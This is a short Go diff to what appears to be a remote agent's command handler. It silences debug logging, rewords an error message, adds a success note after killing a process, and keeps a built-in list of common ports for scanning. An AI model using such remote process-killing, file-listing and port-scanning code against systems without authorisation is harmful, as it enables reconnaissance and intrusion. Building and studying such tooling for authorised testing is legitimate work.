@@ -9,7 +9,7 @@ import (
 	"net/http"
 	"os"
 	"os/user"
-	"log" // only for debugging
+	//"log" // only for debugging
 	"strconv"
 	"strings"
 	"time"
@@ -171,9 +171,12 @@ func RunCommand(command string) string {
 		case "kill":
 			pid, err := strconv.Atoi(cmdArgs[1])
 			if (err != nil) {
-				output = "[!] Golang Error: " + string(err.Error())
+				output = "[!] Error: " + string(err.Error())
 			} else {
 				output = string(functions.Kill(pid).Error())
+				if output == "waitid: no child processes" {
+					output = output + " (this means it was successful)"
+				}
 			}
 		case "ls":
 			output = functions.Ls(cmdArgs[1])
@@ -200,11 +203,11 @@ func RunCommand(command string) string {
 			}
 		case "portscan":
 			var ports []int
-			log.Println(cmdArgs)
+			//log.Println(cmdArgs)
 
 			// ports addr workers
 			if cmdArgs[1] == "common" {
-				log.Println("Common scan!")
+				//log.Println("Common scan!")
 				// from awk '$2~/tcp$/' /usr/share/nmap/nmap-services | sort -r -k3 | head -n 1000 | tr -s ' ' | cut -d '/' -f1 | sed 's/\S*\s*\(\S*\).*/\1,/'
 				ports = []int{
 					5601, 9300, 80, 23, 443, 21, 22, 25, 3389, 110, 445, 139, 143, 53, 135, 3306, 8080, 1723, 111,
